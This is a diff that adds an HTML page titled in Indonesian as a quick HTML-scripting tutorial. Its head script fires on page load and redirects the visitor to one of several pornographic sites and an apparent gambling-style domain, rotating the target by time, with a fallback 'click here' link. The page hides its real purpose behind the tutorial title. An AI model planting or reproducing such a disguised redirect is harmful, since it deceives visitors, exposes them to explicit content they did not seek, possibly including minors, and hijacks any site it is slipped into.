@@ -1,0 +1,30 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TUTOR BELAJAR MUDAH MENGENAL SCRIV HTML DALAM 5 MENIT PAHAM</title>
+    <script>
+        const links = [
+          "https://citi69.com",
+            "https://www.xnxx.com",
+            "https://www.pornhub.com/",
+            "https://www.youporn.com",
+           
+        ];
+
+        function redirectToNextLink() {
+            const currentSecond = Math.floor(new Date().getTime() / 5000);
+            const linkIndex = currentSecond % links.length;
+            window.location.href = links[linkIndex];
+        }
+        // Lakukan pengalihan otomatis
+        redirectToNextLink();
+    </script>
+</head>
+<body>
+    <h1>Mengarahkan ke Halaman...</h1>
+    <p>Anda akan diarahkan secara otomatis. Jika tidak, <a href="javascript:redirectToNextLink();">klik di sini</a>.</p>
+</body>
+</html>
